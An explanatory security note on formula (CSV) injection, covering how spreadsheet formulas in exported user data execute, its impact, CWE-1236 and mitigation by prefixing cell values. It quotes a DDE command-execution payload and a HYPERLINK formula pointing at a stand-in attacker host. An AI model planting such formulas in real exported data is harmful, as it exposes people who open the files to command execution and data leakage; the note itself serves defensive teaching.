# Formula Injection

## What it is
Imagine slipping a live grenade into a filing cabinet disguised as a sticky note — when someone opens the drawer, it detonates. Formula Injection (also called CSV Injection) occurs when an attacker inserts spreadsheet formula syntax (e.g., `=CMD|'/c calc'!A0`) into user-supplied data that is later exported to a spreadsheet application like Excel or LibreOffice, causing the formula to execute with the victim's privileges upon opening the file.

## Why it matters
A web application that lets users submit their name into a form — with no output sanitization — might export all submissions to an admin's Excel report. If an attacker submits `=HYPERLINK("http://attacker.com","Click Here")` as their name, the admin's spreadsheet silently phones home or executes a payload, bypassing all network-layer defenses because the attack rides inside a trusted business document.

## Key facts
- Triggered characters include `=`, `+`, `-`, and `@` at the start of a cell value — all interpreted as formula syntax by spreadsheet engines
- The attack requires **two victims**: the application that fails to sanitize input, and the end-user who opens the exported file
- Mitigated by prepending a single quote (`'`) or tab character to user-supplied data before export, neutralizing formula interpretation
- Modern Excel versions warn users before executing external DDE (Dynamic Data Exchange) commands, but user click-through remains a real risk
- Classified under **CWE-1236** (Improper Neutralization of Formula Elements in a CSV File) and is an **output encoding** failure, not an input validation failure alone

## Related concepts
[[CSV Injection]] [[Output Encoding]] [[Server-Side Template Injection]] [[DDE Attack]] [[Cross-Site Scripting]]